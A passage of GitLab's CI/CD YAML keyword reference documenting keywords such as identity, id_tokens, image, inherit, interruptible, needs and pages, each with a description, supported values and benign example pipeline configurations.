- [YAML anchors](https://docs.gitlab.com/ci/yaml/yaml_optimization/#yaml-anchors-for-scripts).

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `hooks:pre_get_sources_script`**:

YAML Copy to clipboard

```yaml
job1:
hooks:
    pre_get_sources_script:
      - echo 'hello job1 pre_get_sources_script'
script: echo 'hello job1 script'
```

**Related topics**:

- [GitLab Runner configuration](https://docs.gitlab.com/runner/configuration/advanced-configuration.html#the-runners-section)

### `identity` [Permalink](https://docs.gitlab.com/ci/yaml/\#identity "Permalink")

- Tier: Free, Premium, Ultimate
- Offering: GitLab.com
- Status: Beta

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/142054) in GitLab 16.9 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `google_cloud_support_feature_flag`. This feature is in [beta](https://docs.gitlab.com/policy/development_stages_support/).
- [Enabled on GitLab.com](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/150472) in GitLab 17.1. Feature flag `google_cloud_support_feature_flag` removed.

This feature is in [beta](https://docs.gitlab.com/policy/development_stages_support/).

Use `identity` to authenticate with third party services using identity federation.

**Keyword type**: Job keyword. You can use it only as part of a job or in the [`default:` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: An identifier. Supported providers:

- `google_cloud`: Google Cloud. Must be configured with the [Google Cloud IAM integration](https://docs.gitlab.com/integration/google_cloud_iam/).

**Example of `identity`**:

YAML Copy to clipboard

```yaml
job_with_workload_identity:
identity: google_cloud
script:
    - gcloud compute instances list
```

**Related topics**:

- [Workload Identity Federation](https://cloud.google.com/iam/docs/workload-identity-federation).
- [Google Cloud IAM integration](https://docs.gitlab.com/integration/google_cloud_iam/).

### `id_tokens` [Permalink](https://docs.gitlab.com/ci/yaml/\#id_tokens "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/356986) in GitLab 15.7.

Use `id_tokens` to create [JSON web tokens (JWT)](https://www.rfc-editor.org/rfc/rfc7519) to authenticate with third party services. All
JWTs created this way support OIDC authentication. The required `aud` sub-keyword is used to configure the `aud` claim for the JWT.

**Supported values**:

- Token names with their `aud` claims. `aud` supports:
  - A single string.
  - An array of strings.
  - [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `id_tokens`**:

YAML Copy to clipboard

```yaml
job_with_id_tokens:
id_tokens:
    ID_TOKEN_1:
      aud: https://vault.example.com
    ID_TOKEN_2:
      aud:
        - https://gcp.com
        - https://aws.com
    SIGSTORE_ID_TOKEN:
      aud: sigstore
script:
    - command_to_authenticate_with_vault $ID_TOKEN_1
    - command_to_authenticate_with_aws $ID_TOKEN_2
    - command_to_authenticate_with_gcp $ID_TOKEN_2
```

**Related topics**:

- [ID token authentication](https://docs.gitlab.com/ci/secrets/id_token_authentication/).
- [Connect to cloud services](https://docs.gitlab.com/ci/cloud_services/).
- [Keyless signing with Sigstore](https://docs.gitlab.com/ci/yaml/signing_examples/).

### `image` [Permalink](https://docs.gitlab.com/ci/yaml/\#image "Permalink")

Use `image` to specify a Docker image that the job runs in.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: The name of the image, including the registry path if needed, in one of these formats:

- `<image-name>` (Same as using `<image-name>` with the `latest` tag)
- `<image-name>:<tag>`
- `<image-name>@<digest>`

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `image`**:

YAML Copy to clipboard

```yaml
default:
image: ruby:3.0

rspec:
script: bundle exec rspec

rspec 2.7:
image: registry.example.com/my-group/my-project/ruby:2.7
script: bundle exec rspec
```

In this example, the `ruby:3.0` image is the default for all jobs in the pipeline.
The `rspec 2.7` job does not use the default, because it overrides the default with
a job-specific `image` section.

**Related topics**:

- [Run your CI/CD jobs in Docker containers](https://docs.gitlab.com/ci/docker/using_docker_images/).

#### `image:name` [Permalink](https://docs.gitlab.com/ci/yaml/\#imagename "Permalink")

The name of the Docker image that the job runs in. Similar to [`image`](https://docs.gitlab.com/ci/yaml/#image) used by itself.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**: The name of the image, including the registry path if needed, in one of these formats:

- `<image-name>` (Same as using `<image-name>` with the `latest` tag)
- `<image-name>:<tag>`
- `<image-name>@<digest>`

CI/CD variables [are supported](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file).

**Example of `image:name`**:

YAML Copy to clipboard

```yaml
test-job:
image:
    name: "registry.example.com/my/image:latest"
script: echo "Hello world"
```

**Related topics**:

- [Run your CI/CD jobs in Docker containers](https://docs.gitlab.com/ci/docker/using_docker_images/).

#### `image:entrypoint` [Permalink](https://docs.gitlab.com/ci/yaml/\#imageentrypoint "Permalink")

Command or script to execute as the container’s entry point.

When the Docker container is created, the `entrypoint` is translated to the Docker `--entrypoint` option.
The syntax is similar to the [Dockerfile `ENTRYPOINT` directive](https://docs.docker.com/reference/dockerfile/#entrypoint),
where each shell token is a separate string in the array.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A string.

**Example of `image:entrypoint`**:

YAML Copy to clipboard

```yaml
test-job:
image:
    name: super/sql:experimental
    entrypoint: [""]
script: echo "Hello world"
```

**Related topics**:

- [Override the entrypoint of an image](https://docs.gitlab.com/ci/docker/using_docker_images/#override-the-entrypoint-of-an-image).

#### `image:docker` [Permalink](https://docs.gitlab.com/ci/yaml/\#imagedocker "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/27919) in GitLab 16.7. Requires GitLab Runner 16.7 or later.
- `user` input option [introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/137907) in GitLab 16.8.

Use `image:docker` to pass options to the [Docker executor](https://docs.gitlab.com/runner/executors/docker.html) and the [Kubernetes executor](https://docs.gitlab.com/runner/executors/kubernetes/).
runner. This keyword does not work with other executor types.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

A hash of options for the Docker executor, which can include:

- `platform`: Selects the architecture of the image to pull. When not specified,
the default is the same platform as the host runner.
- `user`: Specify the username or UID to use when running the container.

**Example of `image:docker`**:

YAML Copy to clipboard

```yaml
arm-sql-job:
script: echo "Run sql tests"
image:
    name: super/sql:experimental
    docker:
      platform: arm64/v8
      user: dave
```

**Additional details**:

- `image:docker:platform` maps to the [`docker pull --platform` option](https://docs.docker.com/reference/cli/docker/image/pull/#options).
- `image:docker:user` maps to the [`docker run --user` option](https://docs.docker.com/reference/cli/docker/container/run/#options).

#### `image:kubernetes` [Permalink](https://docs.gitlab.com/ci/yaml/\#imagekubernetes "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/38451) in GitLab 18.0. Requires GitLab Runner 17.11 or later.
- `user` input option [introduced](https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/5469) in GitLab Runner 17.11.
- `user` input option [extended to support `uid:gid` format](https://gitlab.com/gitlab-org/gitlab-runner/-/merge_requests/5540) in GitLab 18.0.

Use `image:kubernetes` to pass options to the GitLab Runner [Kubernetes executor](https://docs.gitlab.com/runner/executors/kubernetes/).
This keyword does not work with other executor types.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

A hash of options for the Kubernetes executor, which can include:

- `user`: Specify the username or UID to use when the container runs. You can also use it to set GID by using the `UID:GID` format.

**Example of `image:kubernetes` with only UID**:

YAML Copy to clipboard

```yaml
arm-sql-job:
script: echo "Run sql tests"
image:
    name: super/sql:experimental
    kubernetes:
      user: "1001"
```

**Example of `image:kubernetes` with both UID and GID**:

YAML Copy to clipboard

```yaml
arm-sql-job:
script: echo "Run sql tests"
image:
    name: super/sql:experimental
    kubernetes:
      user: "1001:1001"
```

#### `image:pull_policy` [Permalink](https://docs.gitlab.com/ci/yaml/\#imagepull_policy "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/21619) in GitLab 15.1 [with a flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_docker_image_pull_policy`. Disabled by default.
- [Enabled on GitLab.com and GitLab Self-Managed](https://gitlab.com/gitlab-org/gitlab/-/issues/363186) in GitLab 15.2.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/issues/363186) in GitLab 15.4. [Feature flag `ci_docker_image_pull_policy`](https://gitlab.com/gitlab-org/gitlab/-/issues/363186) removed.
- Requires GitLab Runner 15.1 or later.

The pull policy that the runner uses to fetch the Docker image.

**Keyword type**: Job keyword. You can use it only as part of a job or in the [`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- A single pull policy, or multiple pull policies in an array.
Can be `always`, `if-not-present`, or `never`.

**Examples of `image:pull_policy`**:

YAML Copy to clipboard

```yaml
job1:
script: echo "A single pull policy."
image:
    name: ruby:3.0
    pull_policy: if-not-present

job2:
script: echo "Multiple pull policies."
image:
    name: ruby:3.0
    pull_policy: [always, if-not-present]
```

**Additional details**:

- If the runner does not support the defined pull policy, the job fails with an error similar to:
`ERROR: Job failed (system failure): the configured PullPolicies ([always]) are not allowed by AllowedPullPolicies ([never])`.

**Related topics**:

- [Run your CI/CD jobs in Docker containers](https://docs.gitlab.com/ci/docker/using_docker_images/).
- [Configure how runners pull images](https://docs.gitlab.com/runner/executors/docker.html#configure-how-runners-pull-images).
- [Set multiple pull policies](https://docs.gitlab.com/runner/executors/docker.html#set-multiple-pull-policies).

### `inherit` [Permalink](https://docs.gitlab.com/ci/yaml/\#inherit "Permalink")

Use `inherit` to [control inheritance of default keywords and variables](https://docs.gitlab.com/ci/jobs/#control-the-inheritance-of-default-keywords-and-variables).

#### `inherit:default` [Permalink](https://docs.gitlab.com/ci/yaml/\#inheritdefault "Permalink")

Use `inherit:default` to control the inheritance of [default keywords](https://docs.gitlab.com/ci/yaml/#default).

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `true` (default) or `false` to enable or disable the inheritance of all default keywords.
- A list of specific default keywords to inherit.

**Example of `inherit:default`**:

YAML Copy to clipboard

```yaml
default:
retry: 2
image: ruby:3.0
interruptible: true

job1:
script: echo "This job does not inherit any default keywords."
inherit:
    default: false

job2:
script: echo "This job inherits only the two listed default keywords. It does not inherit 'interruptible'."
inherit:
    default:
      - retry
      - image
```

**Additional details**:

- You can also list default keywords to inherit on one line: `default: [keyword1, keyword2]`

#### `inherit:variables` [Permalink](https://docs.gitlab.com/ci/yaml/\#inheritvariables "Permalink")

Use `inherit:variables` to control the inheritance of [default variables](https://docs.gitlab.com/ci/yaml/#default-variables) keywords.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `true` (default) or `false` to enable or disable the inheritance of all default variables.
- A list of specific variables to inherit.

**Example of `inherit:variables`**:

YAML Copy to clipboard

```yaml
variables:
VARIABLE1: "This is default variable 1"
VARIABLE2: "This is default variable 2"
VARIABLE3: "This is default variable 3"

job1:
script: echo "This job does not inherit any default variables."
inherit:
    variables: false

job2:
script: echo "This job inherits only the two listed default variables. It does not inherit 'VARIABLE3'."
inherit:
    variables:
      - VARIABLE1
      - VARIABLE2
```

**Additional details**:

- You can also list default variables to inherit on one line: `variables: [VARIABLE1, VARIABLE2]`

### `interruptible` [Permalink](https://docs.gitlab.com/ci/yaml/\#interruptible "Permalink")

History

- Support for `trigger` jobs [introduced](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/138508) in GitLab 16.8.

Use `interruptible` to configure the [auto-cancel redundant pipelines](https://docs.gitlab.com/ci/pipelines/settings/#auto-cancel-redundant-pipelines)
feature to cancel a job before it completes if a new pipeline on the same ref starts for a newer commit. If the feature
is disabled, the keyword has no effect. The new pipeline must be for a commit with new changes. For example,
the **Auto-cancel redundant pipelines** feature has no effect
if you select **New pipeline** in the UI to run a pipeline for the same commit.

The behavior of the **Auto-cancel redundant pipelines** feature can be controlled by
the [`workflow:auto_cancel:on_new_commit`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_new_commit) setting.

**Keyword type**: Job keyword. You can use it only as part of a job or in the
[`default` section](https://docs.gitlab.com/ci/yaml/#default).

**Supported values**:

- `true` or `false` (default).

**Example of `interruptible` with the default behavior**:

YAML Copy to clipboard

```yaml
workflow:
auto_cancel:
    on_new_commit: conservative # the default behavior

stages:
  - stage1
  - stage2
  - stage3

step-1:
stage: stage1
script:
    - echo "Can be canceled."
interruptible: true

step-2:
stage: stage2
script:
    - echo "Can not be canceled."

step-3:
stage: stage3
script:
    - echo "Because step-2 can not be canceled, this step can never be canceled, even though it's set as interruptible."
interruptible: true
```

In this example, a new pipeline causes a running pipeline to be:

- Canceled, if only `step-1` is running or pending.
- Not canceled, after `step-2` starts.

**Example of `interruptible` with the `auto_cancel:on_new_commit:interruptible` setting**:

YAML Copy to clipboard

```yaml
workflow:
auto_cancel:
    on_new_commit: interruptible

stages:
  - stage1
  - stage2
  - stage3

step-1:
stage: stage1
script:
    - echo "Can be canceled."
interruptible: true

step-2:
stage: stage2
script:
    - echo "Can not be canceled."

step-3:
stage: stage3
script:
    - echo "Can be canceled."
interruptible: true
```

In this example, a new pipeline causes a running pipeline to cancel `step-1` and `step-3` if they are running or pending.

**Additional details**:

- Only set `interruptible: true` if the job can be safely canceled after it has started,
like a build job. Deployment jobs usually shouldn’t be canceled, to prevent partial deployments.
- When using the default behavior or `workflow:auto_cancel:on_new_commit: conservative`:
  - A job that has not started yet is always considered `interruptible: true`, regardless of the job’s configuration.
    The `interruptible` configuration is only considered after the job starts.
  - **Running** pipelines are only canceled if all running jobs are configured with `interruptible: true` or
    no jobs configured with `interruptible: false` have started at any time.
    After a job with `interruptible: false` starts, the entire pipeline is no longer
    considered interruptible.
  - If the pipeline triggered a downstream pipeline, but no job with `interruptible: false`
    in the downstream pipeline has started yet, the downstream pipeline is also canceled.
- You can add an optional manual job with `interruptible: false` in the first stage of
a pipeline to allow users to manually prevent a pipeline from being automatically
canceled. After a user starts the job, the pipeline cannot be canceled by the
**Auto-cancel redundant pipelines** feature.
- When using `interruptible` with a [trigger job](https://docs.gitlab.com/ci/yaml/#trigger):
  - The triggered downstream pipeline is never affected by the trigger job’s `interruptible` configuration.
  - If [`workflow:auto_cancel`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_new_commit) is set to `conservative`,
    the trigger job’s `interruptible` configuration has no effect.
  - If [`workflow:auto_cancel`](https://docs.gitlab.com/ci/yaml/#workflowauto_cancelon_new_commit) is set to `interruptible`,
    a trigger job with `interruptible: true` can be automatically canceled.

### `needs` [Permalink](https://docs.gitlab.com/ci/yaml/\#needs "Permalink")

Use `needs` to execute jobs out-of-order. Relationships between jobs
that use `needs` can be visualized as a [directed acyclic graph](https://docs.gitlab.com/ci/yaml/needs/).

You can ignore stage ordering and run some jobs without waiting for others to complete.
Jobs in multiple stages can run concurrently.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- An array of jobs (maximum of 50 jobs).
- An empty array ( `[]`), to set the job to start as soon as the pipeline is created.

**Example of `needs`**:

YAML Copy to clipboard

```yaml
linux:build:
stage: build
script: echo "Building linux..."

mac:build:
stage: build
script: echo "Building mac..."

lint:
stage: test
needs: []
script: echo "Linting..."

linux:rspec:
stage: test
needs: ["linux:build"]
script: echo "Running rspec on linux..."

mac:rspec:
stage: test
needs: ["mac:build"]
script: echo "Running rspec on mac..."

production:
stage: deploy
script: echo "Running production..."
environment: production
```

This example creates four paths of execution:

- Linter: The `lint` job runs immediately without waiting for the `build` stage
to complete because it has no needs ( `needs: []`).
- Linux path: The `linux:rspec` job runs as soon as the `linux:build`
job finishes, without waiting for `mac:build` to finish.
- macOS path: The `mac:rspec` jobs runs as soon as the `mac:build`
job finishes, without waiting for `linux:build` to finish.
- The `production` job runs as soon as all previous jobs finish:
`lint`, `linux:build`, `linux:rspec`, `mac:build`, `mac:rspec`.

**Additional details**:

- The maximum number of jobs that a single job can have in the `needs` array is limited:
  - For GitLab.com, the limit is 50. For more information, see
    [issue 350398](https://gitlab.com/gitlab-org/gitlab/-/issues/350398).
  - For GitLab Self-Managed, the default limit is 50. This limit [can be changed](https://docs.gitlab.com/administration/cicd/#set-the-needs-job-limit).
- If `needs` refers to a job that uses the [`parallel`](https://docs.gitlab.com/ci/yaml/#parallel) keyword,
it depends on all jobs created in parallel, not just one job. It also downloads
artifacts from all the parallel jobs by default. If the artifacts have the same
name, they overwrite each other and only the last one downloaded is saved.
  - To have `needs` refer to a subset of parallelized jobs (and not all of the parallelized jobs),
    use the [`needs:parallel:matrix`](https://docs.gitlab.com/ci/yaml/#needsparallelmatrix) keyword.
- You can refer to jobs in the same stage as the job you are configuring.
- If `needs` refers to a job that might not be added to
a pipeline because of `only`, `except`, or `rules`, the pipeline might fail to create. Use the [`needs:optional`](https://docs.gitlab.com/ci/yaml/#needsoptional) keyword to resolve a failed pipeline creation.
- If a pipeline has jobs with `needs: []` and jobs in the [`.pre`](https://docs.gitlab.com/ci/yaml/#stage-pre) stage, they will
all start as soon as the pipeline is created. Jobs with `needs: []` start immediately,
and jobs in the `.pre` stage also start immediately.

#### `needs:artifacts` [Permalink](https://docs.gitlab.com/ci/yaml/\#needsartifacts "Permalink")

When a job uses `needs`, it no longer downloads all artifacts from previous stages
by default, because jobs with `needs` can start before earlier stages complete. With
`needs` you can only download artifacts from the jobs listed in the `needs` configuration.

Use `artifacts: true` (default) or `artifacts: false` to control when artifacts are
downloaded in jobs that use `needs`.

**Keyword type**: Job keyword. You can use it only as part of a job. Must be used with `needs:job`.

**Supported values**:

- `true` (default) or `false`.

**Example of `needs:artifacts`**:

YAML Copy to clipboard

```yaml
test-job1:
stage: test
needs:
    - job: build_job1
      artifacts: true

test-job2:
stage: test
needs:
    - job: build_job2
      artifacts: false

test-job3:
needs:
    - job: build_job1
      artifacts: true
    - job: build_job2
    - build_job3
```

In this example:

- The `test-job1` job downloads the `build_job1` artifacts
- The `test-job2` job does not download the `build_job2` artifacts.
- The `test-job3` job downloads the artifacts from all three `build_jobs`, because
`artifacts` is `true`, or defaults to `true`, for all three needed jobs.

**Additional details**:

- You should not combine `needs` with [`dependencies`](https://docs.gitlab.com/ci/yaml/#dependencies) in the same job.

#### `needs:project` [Permalink](https://docs.gitlab.com/ci/yaml/\#needsproject "Permalink")

- Tier: Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

Use `needs:project` to download artifacts from up to five jobs in other pipelines.
The artifacts are downloaded from the latest successful specified job for the specified ref.
To specify multiple jobs, add each as separate array items under the `needs` keyword.

If there is a pipeline running for the ref, a job with `needs:project`
does not wait for the pipeline to complete. Instead, the artifacts are downloaded
from the latest successful run of the specified job.

`needs:project` must be used with `job`, `ref`, and `artifacts`.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `needs:project`: A full project path, including namespace and group.
- `job`: The job to download artifacts from.
- `ref`: The ref to download artifacts from.
- `artifacts`: Must be `true` to download artifacts.

**Examples of `needs:project`**:

YAML Copy to clipboard

```yaml
build_job:
stage: build
script:
    - ls -lhR
needs:
    - project: namespace/group/project-name
      job: build-1
      ref: main
      artifacts: true
    - project: namespace/group/project-name-2
      job: build-2
      ref: main
      artifacts: true
```

In this example, `build_job` downloads the artifacts from the latest successful `build-1` and `build-2` jobs
on the `main` branches in the `group/project-name` and `group/project-name-2` projects.

You can use [CI/CD variables](https://docs.gitlab.com/ci/variables/where_variables_can_be_used/#gitlab-ciyml-file) in `needs:project`, for example:

YAML Copy to clipboard

```yaml
build_job:
stage: build
script:
    - ls -lhR
needs:
    - project: $CI_PROJECT_PATH
      job: $DEPENDENCY_JOB_NAME
      ref: $ARTIFACTS_DOWNLOAD_REF
      artifacts: true
```

**Additional details**:

- To download artifacts from a different pipeline in the current project, set `project`
to be the same as the current project, but use a different ref than the current pipeline.
Concurrent pipelines running on the same ref could override the artifacts.
- The user running the pipeline must have at least the Reporter role for the group or project,
or the group/project must have public visibility.
- You can’t use `needs:project` in the same job as [`trigger`](https://docs.gitlab.com/ci/yaml/#trigger).
- When using `needs:project` to download artifacts from another pipeline, the job does not wait for
the needed job to complete. [Using `needs` to wait for jobs to complete](https://docs.gitlab.com/ci/yaml/needs/)
is limited to jobs in the same pipeline. Make sure that the needed job in the other
pipeline completes before the job that needs it tries to download the artifacts.
- You can’t download artifacts from jobs that run in [`parallel`](https://docs.gitlab.com/ci/yaml/#parallel).
- Support [CI/CD variables](https://docs.gitlab.com/ci/variables/) in `project`, `job`, and `ref`.

**Related topics**:

- To download artifacts between [parent-child pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines),
use [`needs:pipeline:job`](https://docs.gitlab.com/ci/yaml/#needspipelinejob).

#### `needs:pipeline:job` [Permalink](https://docs.gitlab.com/ci/yaml/\#needspipelinejob "Permalink")

A [child pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines) can download artifacts from a
successfully finished job in its parent pipeline or another child pipeline in the same parent-child pipeline hierarchy.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- `needs:pipeline`: A pipeline ID. Must be a pipeline present in the same parent-child pipeline hierarchy.
- `job`: The job to download artifacts from.

**Example of `needs:pipeline:job`**:

- Parent pipeline ( `.gitlab-ci.yml`):



YAML Copy to clipboard





```yaml
stages:
  - build
  - test

create-artifact:
stage: build
script: echo "sample artifact" > artifact.txt
artifacts:
    paths: [artifact.txt]

child-pipeline:
stage: test
trigger:
    include: child.yml
    strategy: depend
variables:
    PARENT_PIPELINE_ID: $CI_PIPELINE_ID
```

- Child pipeline ( `child.yml`):



YAML Copy to clipboard





```yaml
use-artifact:
    script: cat artifact.txt
    needs:
    - pipeline: $PARENT_PIPELINE_ID
      job: create-artifact
```

In this example, the `create-artifact` job in the parent pipeline creates some artifacts.
The `child-pipeline` job triggers a child pipeline, and passes the `CI_PIPELINE_ID`
variable to the child pipeline as a new `PARENT_PIPELINE_ID` variable. The child pipeline
can use that variable in `needs:pipeline` to download artifacts from the parent pipeline.
Having the `create-artifact` and `child-pipeline` jobs in subsequent stages ensures that
the `use-artifact` job only executes when `create-artifact` has successfully finished.

**Additional details**:

- The `pipeline` attribute does not accept the current pipeline ID ( `$CI_PIPELINE_ID`).
To download artifacts from a job in the current pipeline, use [`needs:artifacts`](https://docs.gitlab.com/ci/yaml/#needsartifacts).
- You cannot use `needs:pipeline:job` in a [trigger job](https://docs.gitlab.com/ci/yaml/#trigger), or to fetch artifacts
from a [multi-project pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#multi-project-pipelines).
To fetch artifacts from a multi-project pipeline use [`needs:project`](https://docs.gitlab.com/ci/yaml/#needsproject).
- The job listed in `needs:pipeline:job` must complete with a status of `success`
or the artifacts can’t be fetched. [Issue 367229](https://gitlab.com/gitlab-org/gitlab/-/issues/367229)
proposes to allow fetching artifacts from any job with artifacts.

#### `needs:optional` [Permalink](https://docs.gitlab.com/ci/yaml/\#needsoptional "Permalink")

To need a job that sometimes does not exist in the pipeline, add `optional: true`
to the `needs` configuration. If not defined, `optional: false` is the default.

Jobs that use [`rules`](https://docs.gitlab.com/ci/yaml/#rules), [`only`, or `except`](https://docs.gitlab.com/ci/yaml/deprecated_keywords/#only--except) and that are added with [`include`](https://docs.gitlab.com/ci/yaml/#include)
might not always be added to a pipeline. GitLab checks the `needs` relationships before starting a pipeline:

- If the `needs` entry has `optional: true` and the needed job is present in the pipeline,
the job waits for it to complete before starting.
- If the needed job is not present, the job can start when all other needs requirements are met.
- If the `needs` section contains only optional jobs, and none are added to the pipeline,
the job starts immediately (the same as an empty `needs` entry: `needs: []`).
- If a needed job has `optional: false`, but it was not added to the pipeline, the
pipeline fails to start with an error similar to: `'job1' job needs 'job2' job, but it was not added to the pipeline`.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Example of `needs:optional`**:

YAML Copy to clipboard

```yaml
build-job:
stage: build

test-job1:
stage: test

test-job2:
stage: test
rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH

deploy-job:
stage: deploy
needs:
    - job: test-job2
      optional: true
    - job: test-job1
environment: production

review-job:
stage: deploy
needs:
    - job: test-job2
      optional: true
environment: review
```

In this example:

- `build-job`, `test-job1`, and `test-job2` start in stage order.
- When the branch is the default branch, `test-job2` is added to the pipeline, so:
  - `deploy-job` waits for both `test-job1` and `test-job2` to complete.
  - `review-job` waits for `test-job2` to complete.
- When the branch is not the default branch, `test-job2` is not added to the pipeline, so:
  - `deploy-job` waits for only `test-job1` to complete, and does not wait for the missing `test-job2`.
  - `review-job` has no other needed jobs and starts immediately (at the same time as `build-job`),
    like `needs: []`.

#### `needs:pipeline` [Permalink](https://docs.gitlab.com/ci/yaml/\#needspipeline "Permalink")

You can mirror the pipeline status from an upstream pipeline to a job by
using the `needs:pipeline` keyword. The latest pipeline status from the default branch is
replicated to the job.

**Keyword type**: Job keyword. You can use it only as part of a job.

**Supported values**:

- A full project path, including namespace and group. If the
project is in the same group or namespace, you can omit them from the `project`
keyword. For example: `project: group/project-name` or `project: project-name`.

**Example of `needs:pipeline`**:

YAML Copy to clipboard

```yaml
upstream_status:
stage: test
needs:
    pipeline: other/project
```

**Additional details**:

- If you add the `job` keyword to `needs:pipeline`, the job no longer mirrors the
pipeline status. The behavior changes to [`needs:pipeline:job`](https://docs.gitlab.com/ci/yaml/#needspipelinejob).

#### `needs:parallel:matrix` [Permalink](https://docs.gitlab.com/ci/yaml/\#needsparallelmatrix "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/254821) in GitLab 16.3.

Jobs can use [`parallel:matrix`](https://docs.gitlab.com/ci/yaml/#parallelmatrix) to run a job multiple times in parallel in a single pipeline,
but with different variable values for each instance of the job.

Use `needs:parallel:matrix` to execute jobs out-of-order depending on parallelized jobs.

**Keyword type**: Job keyword. You can use it only as part of a job. Must be used with `needs:job`.

**Supported values**: An array of hashes of variables:

- The variables and values must be selected from the variables and values defined in the `parallel:matrix` job.

**Example of `needs:parallel:matrix`**:

YAML Copy to clipboard

```yaml
linux:build:
stage: build
script: echo "Building linux..."
parallel:
    matrix:
      - PROVIDER: aws
        STACK:
          - monitoring
          - app1
          - app2

linux:rspec:
stage: test
needs:
    - job: linux:build
      parallel:
        matrix:
          - PROVIDER: aws
            STACK: app1
script: echo "Running rspec on linux..."
```

The previous example generates the following jobs:

Copy to clipboard

```plaintext
linux:build: [aws, monitoring]
linux:build: [aws, app1]
linux:build: [aws, app2]
linux:rspec
```

The `linux:rspec` job runs as soon as the `linux:build: [aws, app1]` job finishes.

**Related topics**:

- [Specify a parallelized job using needs with multiple parallelized jobs](https://docs.gitlab.com/ci/jobs/job_control/#specify-a-parallelized-job-using-needs-with-multiple-parallelized-jobs).

**Additional details**:

- The order of the matrix variables in `needs:parallel:matrix` must match the order
of the matrix variables in the needed job. For example, reversing the order of
the variables in the `linux:rspec` job in the previous example would be invalid:



YAML Copy to clipboard





```yaml
linux:rspec:
    stage: test
    needs:
    - job: linux:build
      parallel:
        matrix:
          - STACK: app1        # The variable order does not match `linux:build` and is invalid.
            PROVIDER: aws
script: echo "Running rspec on linux..."
```

### `pages` [Permalink](https://docs.gitlab.com/ci/yaml/\#pages "Permalink")

Use `pages` to define a [GitLab Pages](https://docs.gitlab.com/user/project/pages/) job that
uploads static content to GitLab. The content is then published as a website.

You must:

- Define `pages: true` to publish a directory named `public`
- Alternatively, define [`pages.publish`](https://docs.gitlab.com/ci/yaml/#pagespublish) if want to use a different content directory.
- Have a non-empty `index.html` file in the root of the content directory.

**Keyword type**: Job keyword or Job name (deprecated). You can use it only as part of a job.

**Supported Values**:

- A boolean. Uses the default configuration when set to `true`
- A hash of configuration options, see the following sections for details.

**Example of `pages`**:

YAML Copy to clipboard

```yaml
create-pages:
stage: deploy
script:
    - mv my-html-content public
pages: true  # specifies that this is a Pages job and publishes the default public directory
rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
environment: production
```

This example renames the `my-html-content/` directory to `public/`.
This directory is exported as an artifact and published with GitLab Pages.

**Example using a configuration hash**:

YAML Copy to clipboard

```yaml
create-pages:
stage: deploy
script:
    - echo "nothing to do here"
pages:  # specifies that this is a Pages job and publishes the default public directory
    publish: my-html-content
    expire_in: "1 week"
rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
environment: production
```

This example does not move the directory, but uses the `publish` property directly.
It also configures the pages deployment to be unpublished after a week.

**Additional details**:

- Using `pages` as a job name [is deprecated](https://docs.gitlab.com/ci/yaml/deprecated_keywords/#publish-keyword-and-pages-job-name-for-gitlab-pages).
- To use `pages` as a job name without triggering a Pages deployment, set the `pages` property to false

#### `pages.publish` [Permalink](https://docs.gitlab.com/ci/yaml/\#pagespublish "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/415821) in GitLab 16.1.
- [Changed](https://gitlab.com/gitlab-org/gitlab/-/issues/500000) to allow variables when passed to `publish` property in GitLab 17.9.
- [Moved](https://gitlab.com/gitlab-org/gitlab/-/issues/428018) the `publish` property under the `pages` keyword in GitLab 17.9.
- [Appended](https://gitlab.com/gitlab-org/gitlab/-/issues/428018) the `pages.publish` path automatically to `artifacts:paths` in GitLab 17.10.

Use `pages.publish` to configure the content directory of a [`pages` job](https://docs.gitlab.com/ci/yaml/#pages).

